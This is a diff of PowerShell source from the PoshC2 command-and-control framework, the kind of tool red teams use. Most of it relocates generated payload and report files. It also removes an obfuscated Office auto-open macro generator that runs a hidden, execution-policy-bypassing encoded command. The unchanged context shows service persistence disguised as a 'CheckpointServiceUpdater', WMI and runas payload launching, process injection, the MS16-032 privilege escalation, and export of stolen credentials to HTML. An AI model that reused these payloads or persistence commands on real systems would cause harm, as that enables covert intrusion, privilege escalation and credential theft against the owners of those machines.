@@ -259,83 +259,9 @@ primer | iex }'
         $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
         $payloadraw = 'powershell -exec bypass -windowstyle hidden -Noninteractive -e '+[Convert]::ToBase64String($bytes)
         $payload = $payloadraw -replace "`n", ""
-        [IO.File]::WriteAllLines("$FolderPath\payload.bat", $payload)
+        [IO.File]::WriteAllLines("$FolderPath\payloads\payload.bat", $payload)
 
-        Write-Host -Object "Payload written to: $FolderPath\payload.bat"  -ForegroundColor Green
-    }
-
-    # create macropayloads
-    function CreateMacroPayload 
-    {
-        $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-        $payloadraw = [Convert]::ToBase64String($bytes)
-        $payload = $payloadraw -replace "`n", ""
-        $payloadbits = $null
-        While ($payload)
-        {
-            $y = $payload[0..75] -join ''
-            $payload = $payload -replace $y,''
-            $payloadbits = $payloadbits +'str = str + "'+$y+'"'+"`n"
-        }
-
-        $macro = '
-        Sub Auto_Open()
-        UpdateMacro
-        End Sub
-
-        Sub AutoOpen()
-        UpdateMacro
-        End Sub
-
-        Sub Workbook_Open()
-        UpdateMacro
-        End Sub
-
-        Sub WorkbookOpen()
-        UpdateMacro
-        End Sub
-
-        Sub Document_Open()
-        UpdateMacro
-        End Sub
-
-        Sub DocumentOpen()
-        UpdateMacro
-        End Sub
-
-        Sub UpdateMacro()
-        Dim str As String
-        Dim exec As String
-        Dim wshShell
-
-        Set wshShell = CreateObject("WScript.Shell")
-
-        str = ""
-'+$payloadbits+'
-
-        exec = "p"
-        exec = exec + "o"
-        exec = exec + "w"
-        exec = exec + "e"
-        exec = exec + "r"
-        exec = exec + "s"
-        exec = exec + "h"
-        exec = exec + "e"
-        exec = exec + "l"
-        exec = exec + "l"
-        exec = exec + "."
-        exec = exec + "e"
-        exec = exec + "x"
-        exec = exec + "e"
-        exec = exec + " -exec bypass -windowstyle hidden -Noninteractive -e " & str
-
-        Shell(exec)
-
-        End Sub'
-
-        [IO.File]::WriteAllLines("$FolderPath\macro.txt", $macro)
-
-        Write-Host -Object "Payload written to: $FolderPath\macro.txt"  -ForegroundColor Green
+        Write-Host -Object "Payload written to: $FolderPath\payloads\payload.bat"  -ForegroundColor Green
     }
 
     # create proxypayloads
@@ -399,9 +325,9 @@ primer | iex }'
         $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
         $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
         $payload = $payloadraw -replace "`n", ""
-        [IO.File]::WriteAllLines("$FolderPath\proxypayload.bat", $payload)
+        [IO.File]::WriteAllLines("$FolderPath\payloads\proxypayload.bat", $payload)
         [IO.File]::WriteAllLines("C:\Temp\PowershellC2\Modules\proxypayload.ps1", "`$proxypayload = '$payload'")
-        Write-Host -Object "Payload written to: $FolderPath\proxypayload.bat"  -ForegroundColor Green
+        Write-Host -Object "Payload written to: $FolderPath\payloads\proxypayload.bat"  -ForegroundColor Green
         Write-Host -Object "Payload written to: C:\Temp\PowershellC2\Modules\proxypayload.ps1"  -ForegroundColor Green
     }
 
@@ -608,13 +534,13 @@ param
             }
             if ($pscommand -eq 'Install-ServiceLevel-Persistence') 
             {
-                $payload = Get-Content -Path "$FolderPath\payload.bat"
+                $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                 $pscommand = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
             }
             if ($pscommand -eq 'Install-ServiceLevel-PersistenceWithProxy') 
             {
-                if (Test-Path "$FolderPath\proxypayload.bat"){
-                    $payload = Get-Content -Path "$FolderPath\proxypayload.bat"
+                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){
+                    $payload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
                     $pscommand = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
                 } else {
                     write-host "Need to run CreateProxyPayload first"
@@ -623,9 +549,9 @@ param
             }
             if ($pscommand.ToLower().StartsWith('invoke-wmiproxypayload'))
             {
-                if (Test-Path "$FolderPath\proxypayload.bat"){ 
+                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                     CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
-                    $proxypayload = Get-Content -Path "$FolderPath\proxypayload.bat"
+                    $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
                     $pscommand = $pscommand -replace 'Invoke-WMIProxyPayload', 'Invoke-WMICommand'
                     $pscommand = $pscommand + " -command '$proxypayload'"
                 } else {
@@ -635,9 +561,9 @@ param
             }
             if ($pscommand.ToLower().StartsWith('invoke-wmipayload'))
             {
-                if (Test-Path "$FolderPath\payload.bat"){ 
+                if (Test-Path "$FolderPath\payloads\payload.bat"){ 
                     CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
-                    $payload = Get-Content -Path "$FolderPath\payload.bat"
+                    $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                     $pscommand = $pscommand -replace 'Invoke-WMIPayload', 'Invoke-WMICommand'
                     $pscommand = $pscommand + " -command '$payload'"
                 } else {
@@ -702,7 +628,7 @@ $error.clear()
             }
             if ($pscommand.ToLower().StartsWith('invoke-psinject-proxypayload'))
             { 
-                if (Test-Path "$FolderPath\proxypayload.bat"){ 
+                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                 CheckModuleLoaded "invoke-psinject.ps1" $psrandomuri
                 CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                 CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
@@ -819,8 +745,8 @@ $error.clear()
             }     
             if ($pscommand.ToLower().StartsWith('invoke-runasproxypayload'))
             { 
-            if (Test-Path "$FolderPath\proxypayload.bat"){ 
-                $proxypayload = Get-Content -Path "$FolderPath\proxypayload.bat"     
+            if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
+                $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"     
                 $query = "INSERT INTO NewTasks (RandomURI, Command)
                 VALUES (@RandomURI, @Command)"
                 Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
@@ -838,7 +764,7 @@ $error.clear()
             }         
             if ($pscommand -eq 'StartAnotherImplantWithProxy') 
             {
-                if (Test-Path "$FolderPath\proxypayload.bat"){ 
+                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                 CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                 CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                 $pscommand = 'start-process -windowstyle hidden cmd -args "/c $proxypayload"'
@@ -907,7 +833,7 @@ $error.clear()
             }
             if ($pscommand -eq 'invoke-ms16-032-proxypayload')
             { 
-                if (Test-Path "$FolderPath\proxypayload.bat"){ 
+                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                 CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                 CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                 $pscommand = "LoadModule invoke-ms16-032-proxy.ps1"
@@ -919,7 +845,7 @@ $error.clear()
             # write-host " Get-System | Get-System-WithProxy" -ForegroundColor Green 
             if ($pscommand -eq 'Get-System') 
             {
-                $payload = Get-Content -Path "$FolderPath\payload.bat"
+                $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                 $query = "INSERT INTO NewTasks (RandomURI, Command)
                 VALUES (@RandomURI, @Command)"
 
@@ -940,8 +866,8 @@ $error.clear()
             }
             if ($pscommand -eq 'Get-System-WithProxy') 
             {
-                if (Test-Path "$FolderPath\proxypayload.bat"){
-                    $payload = Get-Content -Path "$FolderPath\proxypayload.bat"
+                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){
+                    $payload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
 
                     $query = "INSERT INTO NewTasks (RandomURI, Command)
                     VALUES (@RandomURI, @Command)"
@@ -982,7 +908,7 @@ $error.clear()
                     $CredLog.Hash = $cred.Hash;
                     $CredsArray += $CredLog
                 }
-                $CredsArray | ConvertTo-Html -title "<title>Credential List from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\Creds.html"
+                $CredsArray | ConvertTo-Html -title "<title>Credential List from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\Creds.html"
 
                $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants" -As PSObject
                $ImplantsArray = @()
@@ -1002,7 +928,7 @@ $error.clear()
                     $ImplantsArray += $ImplantLog
                }
 
-               $ImplantsArray | ConvertTo-Html -title "<title>Implant List from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\Implants.html"
+               $ImplantsArray | ConvertTo-Html -title "<title>Implant List from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\Implants.html"
 
                $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks" -As PSObject
                $TasksArray = @()
@@ -1015,7 +941,7 @@ $error.clear()
                     $ImplantTask.Output = $task.Output;
                     $TasksArray += $ImplantTask
                }
-               $TasksArray | ConvertTo-Html -title "<title>Tasks from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\ImplantTasks.html"
+               $TasksArray | ConvertTo-Html -title "<title>Tasks from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\ImplantTasks.html"
                $pscommand = 'fvdsghfdsyyh'
             }
             $pscommand
